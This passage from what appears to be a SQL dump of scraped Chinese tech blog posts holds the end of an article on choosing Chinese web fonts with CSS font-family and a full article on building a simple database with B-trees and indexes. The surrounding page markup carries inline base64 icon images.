DLzxGz8xb8aSm05u2kL4bF9N902I89yzHe986PEseoGP2YjqfvpNQeTr+4rmEKucz6LgS9f1jUuiy+VIfvxvz1GoGN99Hz8wFeGan0zl3Ae4lK3A/vJb2x7PpWPEI3bevoHfJKtypt9H1UgbDZx5E//goofJF+AtmoasWSaG2jZE6P5zg9hQ8Nyyie1Y6rQ+vpafMhdHXx7BpgjWMr7sbT5kL9/IHcUck0X3LtfgLVqAP3YAumoHeHYvaPkYKlRcudf54Bh5KpjP5Fi69tplgIMCQabK/rIxtO3bgqqxkmJHzdXbRknYbrWIcrWEJ9D8RjXaMRe2ciNo5QQr1QYRUjnC8C1Nxr1pD0O/HFwyQmZmJ3W4nLS0Nm83G+vXrsSwLgP6vS2kWo/lNjKN57gTMTyJRH0Si8iZKoXZdI5Ujkt55SXRtfBuAffv2sXLlSpxOJ9nZ2SQkJBAWFobX6wVgoPooLWI0v4hxuFeFY30ahdoVhcqLkEJ9GCV1QRTehZNxZ9wPQNGXX5KZmUlbWxspKSkIIUhPT0dZFibQvSaHJjGKxujxBHZGoT+ehPpwEsoRIYUqmCR1YTTBd2NoGxtOz4Y3CPoDrNuwnuhpU7lq/HgW3LGU5l4P2h+g55XNnBOjORM/jsH3ozGLYlAFMag90ahPI6VQxZOlKo5BOyfjey+GliljaL0uA7l9D2f37uess5KBoyfwbvmIJnsajVePouXeCIKFsZglsajiyX8pvEYKoySm33DGYTjj0OVxhEri6N84kfalY2i/NRb3AhvNN0+i9Y4wPC+H4yuMxTocjzoYj7F/ymVxI/+ryH5huKaeMVzxGK54QuXT8B+y4atIZqB8Nt6SVDzFqXi+mIO39Dp+PziHwdIZDJVOJ3gogZArHsM1BcMVj1E+BcMVe1GY38auNqqnYdQkEKpOJPBNEv7DdnyVdnwVdoYqki+bge9wCv6qFAJVyQS/mU6oJhHjSCJG9VSM6kRUfXi2GK6fJYy6+CyjNrHRqLP1GbWJ0qizSfV39Tap6qdLVW+Xqt4ujfokadRdVpvgNWpt54y6qc8MV44Sfw4An+t+Gj1AKyYAAAAASUVORK5CYII=" style="border: 0;" /> weibo</a></li>\n<li>Feed订阅： <a href="http://www.ruanyifeng.com/feed.html" target="_blank"><img src="data:image/gif;base64,R0lGODlhFAAUANU2APV1GfmrePZ8IeR5VPq2ieNkLf7p3NpFJveCJ/NoFfibVPR1IexiJfvdzuZrNfXGuOhUEueTevaFOfzIpNxDGeZZJNU6IOubifiVTfOnid1aLuZpLOFSJf/28vJtIvGcefaLSd5kNu9iFv/z6//48//t4uFfLfNkCeJNGuGNc/rCof/+/PVxEeldI/V5KeKMbu9nIvB2OvzQtNxMKfOPXP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAADYALAAAAAAUABQAAAb/QJstEjKZCsjCZsl0pIS2QWXaYsA8noVWIEAgFoNhhWNyMESi7Jbr/aZCFdRnZJAFJCwAt+vlOkwtEBk1hDUkExJ6bQJaGyYMLTQTDSOFHQF8jAseSFYiJwkuAQ2FE1xaHjBIMDAgARguJwABJIQTLJswDEgeIgSEJQQILAqVNQEiui1HHgkBhTUGCiwYtR0xLS0VJhtaEgoEBoQkGCfPNSoQY9xaCwAsCBPALgmkJA4cZN0CAAgY/PJqEIDwgVAECjM0bOAnwcAKGQJclKhRgoGDDjUeUDigkN8vQiBOfByAglSDAxw3IBCgYEU0FyJoEPpA4UGNDjMsaHDQR8EdPVYOMmQYQGHAhQgHLIRIsWAlgASsGMRBMWMGBQtYZ7yIsoBRKkhjOMxAiXJGGCEpHGxIYsSIhrcaQmy1EQQAOw==" style="border: 0;" /></a></li>\n\n</ul></div>        \n        <div><p><strong>[广告]</strong>　<a href="http://www.ruanyifeng.com/blog/www.greenvpn.org/1069807?utm_source=ruanyifeng.com" style="border: none;" target="_blank">GreenVPN是一款运营多年的绿色、稳定、安全的VPN产品，帮助您轻松浏览Google、‍Facebook、Youtube、Twitter等，使用简单，手机电脑全平台支持，可免费试用，值得推荐。</a>\n</p>\n\n</div>', '2014-11-06 23:42:47', 2, '2014-11-12 15:34:43', '2014-07-15 00:43:59', 0, '[["\\u5b57\\u4f53", 0.4847924538618581], ["\\u534e\\u6587", 0.3993660848074324], ["\\u4e2d\\u6587\\u5b57\\u4f53", 0.28271409635236483], ["\\u886c\\u7ebf\\u4f53", 0.26252023232719596], ["\\u6977\\u4f53", 0.16436612088513514], ["\\u64cd\\u4f5c\\u7cfb\\u7edf", 0.15651940310388512], ["\\u5b8b\\u4f53", 0.15617012381722975], ["Microsoft", 0.14135704817618241], ["\\u96c5\\u9ed1", 0.14135704817618241], ["\\u5fae\\u8f6f", 0.12196595038878377], ["Mac", 0.12116318415101351], ["Windows", 0.12116318415101351], ["\\u4eff\\u5b8b", 0.10786399777702704], ["\\u7ec6\\u9ed1", 0.10096932012584459], ["font", 0.10096932012584459], ["STXihei", 0.10096932012584459], ["family", 0.10096932012584459], ["YaHei", 0.10096932012584459], ["\\u7f51\\u9875", 0.0966003020220608], ["\\u9884\\u88c5", 0.09392349764864866]]', NULL, NULL, '字体的选择，是网页开发的关键因素之一。 合适的字体，对网页的美观度（或可读性）有着举足轻重的影响。 但是，相比英文字体，中文字体的网页开发有着极大的局限性。因为，一套中文字体最少也要有几千个字符，体积为几个MB；单单为了浏览网页，开发者不可能让用户去下载字体，只能依靠操作系统的预装字体。（*注：确实有网站提供中文字体的web服务，从技术角度，我不推荐这样做。） 不同的操作系统、不同的版本预装不同的字体（因为版权），几乎没有交集。因此，大多数开发者索性忽略中文字体，让操作系统自行渲染，或者用图片呈现字体效果。 下面是目前中文字体的最佳实践，主要参考了Kendra Schaefer的文章。 一、操作系统的预装字体 操作系统决定了开发者可以使用的字体。所以，第一步，我们必须了解操作系统到底提供哪些字体。 Windows操作系统： 黑体：SimHei 宋体：SimSun 新宋体：NSimSun 仿宋：FangSong 楷体：KaiTi 仿宋GB2312：FangSongGB2312 楷体GB2312：KaiTiGB2312 微软雅黑：Microsoft YaHei （Windows 7开始提供） OS X操作系统： 冬青黑体: Hiragino Sans GB （SNOW LEOPARD开始提供） 华文细黑：STHeiti Light （又名STXihei） 华文黑体：STHeiti 华文楷体：STKaiti 华文宋体：STSong 华文仿宋：STFangsong 如果用户装了MicroSoft Office，还会多出一些字体。 隶书：LiSu 幼圆：YouYuan 华文细黑：STXihei 华文楷体：STKaiti 华文宋体：STSong 华文中宋：STZhongsong 华文仿宋：STFangsong 方正舒体：FZShuTi 方正姚体：FZYaoti 华文彩云：STCaiyun 华文琥珀：STHupo 华文隶书：STLiti 华文行楷：STXingkai 华文新魏：STXinwei 二、font-family命令 CSS的font-family命令，指定了网页元素所使用的字体。下面是一个例子。 font-family: Georgia, "Times New Roman", "Microsoft YaHei", "微软雅黑", STXihei, "华文细黑", serif; 它的规则有三条。 （1）优先使用排在前面的字体。 （2）如果找不到该种字体，或者该种字体不包括所要渲染的文字，则使用下一种字体。 （3）如果所列出的字体，都无法满足需要，则让操作系统自行决定使用哪种字体。 根据这些规则，font-family应该优先指定英文字体，然后再指定中文字体。否则，中文字体所包含的英文字母，会取代英文字体，这往往很丑陋。 上面图片中，红框内的英文字母，左边采用英文字体渲染，右边采用中文字体渲染，哪一种效果比较好，一目了然。 为了保证兼容性，中文字体的中文名称和英文名称，应该都写入font-family。比如，"微软雅黑"的英文名称是Microsoft YaHei。 此外，中文字体的中文名称，以及由多个单词组成的英文名称，应该放在双引号内。 三、 Windows平台和Mac平台 由于Windows和Mac的中文字体没有交叉，所以应该同时为两个平台指定字体。 常见的做法是，Windows平台指定"微软雅黑"（Microsoft YaHei），Mac平台指定"华文细黑"（STXihei）。 四、衬线体和无衬线体 所谓"衬线体"（Serif），指的是笔画的末端带有衬线的字体。 就像英文字体一样，中文字体也可以分成"衬线体"和"无衬线体"（San-serif）。比如，对于繁体字来说，微软正黑（Microsoft JhengHei）是无衬线体，新细明体（PMingLiU）是衬线体。 对于简体字来说，微软雅黑（Microsoft yahei）是无衬线体，宋体（SimSun）是衬线体。 一般来说，衬线体装饰性强，往往用于标题；无衬线体清晰度好，往往用于正文。 五、几种常见中文字体 （1）宋体（SimSun） 宋体是最常见的中文字体，如果没有指定字体，操作系统往往选择它来渲染。很多人认为，这种字体并不美观。 （2）微软雅黑（Microsoft YaHei） 微软雅黑的美观度和清晰度都较好，可以作为网页的首选字体。它在Mac平台的对应字体是华文细黑（STXihei）。 但是，Windows XP没有预装这种字体，这时可以选择黑体（Simhei）替代。不过，黑体比较粗，不应用于字号较小的文字。 （3）仿宋（FangSong） 这种字体是衬线体，比宋体的装饰性更强。如果字号太小，会影响清晰度，所以只有在字号大于14px的情况下，才可以考虑这种字体。 它在Mac平台的对应字体是"华文仿宋"（STFangsong）。 （4）楷体（KaiTi） 楷体也是衬线体，装饰性与仿宋体接近，但是宽度更大，笔画更清楚一些。这种字体也不应该在小于14px的情况下使用。 它在Mac平台的对应字体是"华文楷体"（STKaiti）。 （完） 文档信息 版权声明：自由转载-非商用-非衍生-保持署名（创意共享3.0许可证） 发表日期： 2014年7月15日 更多内容： 档案 » 开发者手册 付费支持： 购买文集 社交媒体： twitter， weibo Feed订阅： [广告] GreenVPN是一款运营多年的绿色、稳定、安全的VPN产品，帮助您轻松浏览Google、‍Facebook、Youtube、Twitter等，使用简单，手机电脑全平台支持，可免费试用，值得推荐。', 1, NULL, NULL),
(18, 'http://www.ruanyifeng.com/blog/2014/07/database_implementation.html', '数据库的最简单实现', '<p>所有应用软件之中，数据库可能是最复杂的。</p>\n\n        <p>MySQL的手册有3000多页，PostgreSQL的手册有2000多页，Oracle的手册更是比它们相加还要厚。</p>\n\n<p><img alt="" src="http://image.beekka.com/blog/2014/bg2014070401.jpg" title="" /></p>\n\n<p>但是，自己写一个最简单的数据库，做起来并不难。Reddit上面有一个<a href="http://www.reddit.com/r/Database/comments/27u6dy/how_do_you_build_a_database/ciggal8">帖子</a>，只用了几百个字，就把原理讲清楚了。下面是我根据这个帖子整理的内容。</p>\n\n<h2>一、数据以文本形式保存</h2>\n\n<p>第一步，就是将所要保存的数据，写入文本文件。这个文本文件就是你的数据库。</p>\n\n<p>为了方便读取，数据必须分成记录，每一条记录的长度规定为等长。比如，假定每条记录的长度是800字节，那么第5条记录的开始位置就在3200字节。</p>\n\n<p>大多数时候，我们不知道某一条记录在第几个位置，只知道<a href="http://zh.wikipedia.org/zh/%E5%85%B3%E7%B3%BB%E9%94%AE">主键</a>（primary key）的值。这时为了读取数据，可以一条条比对记录。但是这样做效率太低，实际应用中，数据库往往采用<a href="http://en.wikipedia.org/wiki/B-tree">B树</a>（B-tree）格式储存数据。</p>\n\n<h2>二、什么是B树？</h2>\n\n<p>要理解B树，必须从<a href="http://zh.wikipedia.org/wiki/%E4%BA%8C%E5%85%83%E6%90%9C%E5%B0%8B%E6%A8%B9">二叉查找树</a>（Binary search tree）讲起。</p>\n\n<p><img alt="二叉查找树" src="http://image.beekka.com/blog/2014/bg2014070402.png" title="" /></p>\n\n<p>二叉查找树是一种查找效率非常高的数据结构，它有三个特点。</p>\n\n<blockquote>\n  <p>（1）每个节点最多只有两个子树。</p>\n\n<p>（2）左子树都为小于父节点的值，右子树都为大于父节点的值。</p>\n\n<p>（3）在n个节点中找到目标值，一般只需要log(n)次比较。</p>\n</blockquote>\n\n<p>二叉查找树的结构不适合数据库，因为它的查找效率与层数相关。越处在下层的数据，就需要越多次比较。极端情况下，n个数据需要n次比较才能找到目标值。对于数据库来说，每进入一层，就要从硬盘读取一次数据，这非常致命，因为硬盘的读取时间远远大于数据处理时间，数据库读取硬盘的次数越少越好。</p>\n\n<p>B树是对二叉查找树的改进。它的设计思想是，将相关数据尽量集中在一起，以便一次读取多个数据，减少硬盘操作次数。</p>\n\n<p><img alt="B-tree" src="http://image.beekka.com/blog/2014/bg2014070403.png" title="" /></p>\n\n<p>B树的特点也有三个。</p>\n\n<blockquote>\n  <p>（1）一个节点可以容纳多个值。比如上图中，最多的一个节点容纳了4个值。</p>\n\n<p>（2）除非数据已经填满，否则不会增加新的层。也就是说，B树追求"层"越少越好。</p>\n\n<p>（3）子节点中的值，与父节点中的值，有严格的大小对应关系。一般来说，如果父节点有a个值，那么就有a+1个子节点。比如上图中，父节点有两个值（7和16），就对应三个子节点，第一个子节点都是小于7的值，最后一个子节点都是大于16的值，中间的子节点就是7和16之间的值。</p>\n</blockquote>\n\n<p>这种数据结构，非常有利于减少读取硬盘的次数。假定一个节点可以容纳100个值，那么3层的B树可以容纳100万个数据，如果换成二叉查找树，则需要20层！假定操作系统一次读取一个节点，并且根节点保留在内存中，那么B树在100万个数据中查找目标值，只需要读取两次硬盘。</p>\n\n<h2>三、索引</h2>\n\n<p>数据库以B树格式储存，只解决了按照"主键"查找数据的问题。如果想查找其他字段，就需要建立索引（index）。</p>\n\n<p>所谓索引，就是以某个字段为关键字的B树文件。假定有一张"雇员表"，包含了员工号（主键）和姓名两个字段。可以对姓名建立索引文件，该文件以B树格式对姓名进行储存，每个姓名后面是其在数据库中的位置（即第几条记录）。查找姓名的时候，先从索引中找到对应第几条记录，然后再从表格中读取。</p>\n\n<p>这种索引查找方法，叫做<a href="http://en.wikipedia.org/wiki/ISAM">"索引顺序存取方法"</a>（Indexed Sequential Access Method），缩写为ISAM。它已经有多种实现（比如C-ISAM库和D-ISAM库），只要使用这些代码库，就能自己写一个最简单的数据库。</p>\n\n<h2>四、高级功能</h2>\n\n<p>部署了最基本的数据存取（包括索引）以后，还可以实现一些高级功能。</p>\n\n<p><strong>（1）SQL语言</strong>是数据库通用操作语言，所以需要一个SQL解析器，将SQL命令解析为对应的ISAM操作。</p>\n\n<p><strong>（2）数据库连接（join）</strong>是指数据库的两张表通过"外键"，建立连接关系。你需要对这种操作进行优化。</p>\n\n<p><strong>（3）数据库事务（transaction）</strong>是指批量进行一系列数据库操作，只要有一步不成功，整个操作都不成功。所以需要有一个"操作日志"，以便失败时对操作进行回滚。</p>\n\n<p><strong>（4）备份机制</strong>：保存数据库的副本。</p>\n\n<p><strong>（5）远程操作</strong>：使得用户可以在不同的机器上，通过TCP/IP协议操作数据库。</p>\n\n<p>（完）</p>\n\n        <div><h3>文档信息</h3>\n<ul>\n<li>版权声明：自由转载-非商用-非衍生-保持署名（<a href="http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh">创意共享3.0许可证</a>）</li>\n<li>发表日期： <abbr class="published" title="2014-07-04T15:04:08+08:00">2014年7月 4日</abbr></li>\n<li>更多内容： <a href="http://www.ruanyifeng.com/blog/archives.html" target="_blank"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUBAMAAAB/pwA+AAAAG1BMVEUxAAAdHRseHhwfHx0fHx4gIB4hIR8iIiAjIyCMbVMLAAAAAXRSTlMAQObYZgAAAAFiS0dEAIgFHUgAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfeBgwBJS9jlhpuAAAAcUlEQVQI122OOxKAIAwFQYfegGCLBdjKUfAGNNZ6A49uws/GVDtvdnbCGB6fWLux4SnSNtwZg5PRQLKIMjiIGg5EHD1xFiBVQV0OnsWWRuvKoNFcaXEyIc80UtPklKBOEZjPo6pfDN9nfO8obMd/oawvhiwOwjTYfd0AAAAASUVORK5CYII=" style="border: 0;" /> 档案</a>  » \n<a href="http://www.ruanyifeng.com/blog/computer/"> <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUBAMAAAB/pwA+AAAAG1BMVEUxAAAdHRseHhwfHx0fHx4gIB4hIR8iIiAjIyCMbVMLAAAAAXRSTlMAQObYZgAAAAFiS0dEAIgFHUgAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfeBgwBJS9jlhpuAAAAcUlEQVQI122OOxKAIAwFQYfegGCLBdjKUfAGNNZ6A49uws/GVDtvdnbCGB6fWLux4SnSNtwZg5PRQLKIMjiIGg5EHD1xFiBVQV0OnsWWRuvKoNFcaXEyIc80UtPklKBOEZjPo6pfDN9nfO8obMd/oawvhiwOwjTYfd0AAAAASUVORK5CYII=" style="border: 0;" /> 理解计算机</a> \n</li>\n<li>付费支持：<a href="http://www.ruanyifeng.com/blog/2014/05/my_blog_book.html" target="_blank"><img src="data:image/png;base64,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" style="border: 0;" /> 购买文集</a></li>\n<li>社交媒体：<a href="https://twitter.com/ruanyf" target="_blank"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAk1JREFUeNqsVc9rE0EU/mZ3dhPNJl2bVIk/Km09aFBE8GLvnrwJXvwLxIsgCP4Fnit6E8Gb0IMHwUsL9SSNgiAoooJIpE1Joo1h82uT7IxvxmRN3Q32kAdvdrI773vfe+/bDTu9WioDcDAda3Ja8piepQ1avCkCeny0Y+R9KenKwOmHHLvPaKn7AtVOoO8dOWDCMpg+41gMQv5FNEJACgoE8MsPNLDBhgfoutMOsJDmWLmU037C4TApciljwQ/kHoohQxV06+wMXNvE7WINuaSpvdYVKLgWnl3O4zAxU3Z1IYVGT+B5qYWV9z2kbQaT/cOwTsxOUUYF+mB5Dkmi8HG3h2q9hxsFNwRTdvQgxxnXRrMvIdkEhllis/qtiWuLDm4WZnBlPoWnXz28LHdw0uGR7m9Wu3j0qYGEubfn4UlBfXO4gTZltRNMg9w9f0i7kNFxllsBlS0x75gYfxyWTBUjT2W5CSMSPBrQuG21+hiMDS8CeCzF8eSLp13uQ3Ab1IqMFZN8tFHPmgOBF99bYP8Be1Xp6t7OJszJgKpPSiZvaj7uf2hguz2IBQuozDvFH6RDBjuK9wdQDvt0nMpW+8efGyh5UcAeZb2+UcHbnz5Jx4wdlp4yJYU3kLiQtfBwOYeLc8nIwfXtNu69q2Oz4mMxbemYOOOjKarhvq51KUjg3GwiFPIuvcNF6pnSnWK0lOEabNLgQh1aJFAhlGB9rG110B2+oyRNPc0sZbRNFltmLKDKqj4Qrm1ojzOxDz2pyPQ0P7CK4c40/wJ+CzAAGYrXsvfFXR4AAAAASUVORK5CYII=" style="border: 0;" /> twitter</a>，<a href="http://weibo.com/ruanyf" target="_blank"><img src="data:image/png;base64,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